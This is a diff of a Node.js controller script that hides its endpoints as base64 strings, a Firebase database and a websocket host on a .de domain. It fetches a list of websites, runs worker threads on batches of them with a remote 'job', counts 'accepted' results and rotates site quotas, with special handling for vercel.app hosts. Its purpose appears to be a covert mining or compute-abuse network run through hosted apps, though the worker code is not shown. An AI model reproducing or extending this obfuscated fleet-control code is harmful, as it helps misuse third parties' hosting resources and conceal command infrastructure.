@@ -6,6 +6,8 @@ let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpb
 
 let WSS = decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==')
 
+let SIZE = 20
+
 let mClient = null
 let mJob = null
 let mAccepted = 0
@@ -19,17 +21,21 @@ startServer()
 
 async function startServer() {
     try {
-        let size = 0
         let response = await axios.get(BASE_URL+'website.json?orderBy="quota"&&startAt=0&endAt='+parseInt(new Date().getTime()/1000)+'&print=pretty')
         await waitForJob()
+
+        let list = []
         
         for (let key of Object.keys(response.data)) {
-            try {
-                size++
-                let worker = await addWorker(key, 'https://'+key.replace(/__/g, '-').replace(/_/g, '.'), mJob)
-                worker.on('message', onMessage)
-                mWorker[key] = worker
-            } catch (error) {}
+            list.push(key)
+
+            if (list.length >= SIZE) {
+                try {
+                    let worker = await addWorker(key, list, mJob)
+                    worker.on('message', onMessage)
+                    mWorker[key] = worker
+                } catch (error) {}
+            }
         }
 
         console.log('Worker Size: ', Object.keys(response.data).length)
@@ -54,9 +60,9 @@ function decode(data) {
     return Buffer.from(data, 'base64').toString('ascii')
 }
 
-const addWorker = async (key, url, job) => {
+const addWorker = async (key, list, job) => {
     return new Promise((resolve, reject) => {
-        let worker = new Worker('./worker.js', { workerData: { id:key, url:url, job:job } })
+        let worker = new Worker('./worker.js', { workerData: { id:key, list:list, job:job } })
         resolve(worker)
     })
 }
@@ -69,13 +75,14 @@ const onMessage = function(solved) {
         }
     } else if (solved['status'] == 'CLOSE') {
         try {
-            if (mWorker[solved['id']]) {
-                try {
-                    mWorker[solved['id']].terminate()
-                } catch (error) {}
-                delete mWorker[solved['id']]
-
-                updateUrl(solved['id'])
+            if(solved['key']) {
+                if (solved['id'] != null && mWorker[solved['id']]) {
+                    try {
+                        mWorker[solved['id']].terminate()
+                    } catch (error) {}
+                    delete mWorker[solved['id']]
+                }
+                updateUrl(solved['key'])
             }
         } catch (error) {}
     }
@@ -83,7 +90,11 @@ const onMessage = function(solved) {
 
 async function updateUrl(key) {
     try {
-        await axios.patch(BASE_URL+'website/'+key+'.json', JSON.stringify({ quota:mQuota }), {
+        let quota = parseInt(new Date().getTime()/1000)+86400
+        if (key.endsWith('vercel.app') || key.endsWith('vercel_app')) {
+            quota = mQuota
+        }
+        await axios.patch(BASE_URL+'website/'+key+'.json', JSON.stringify({ quota:quota }), {
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded'
             }
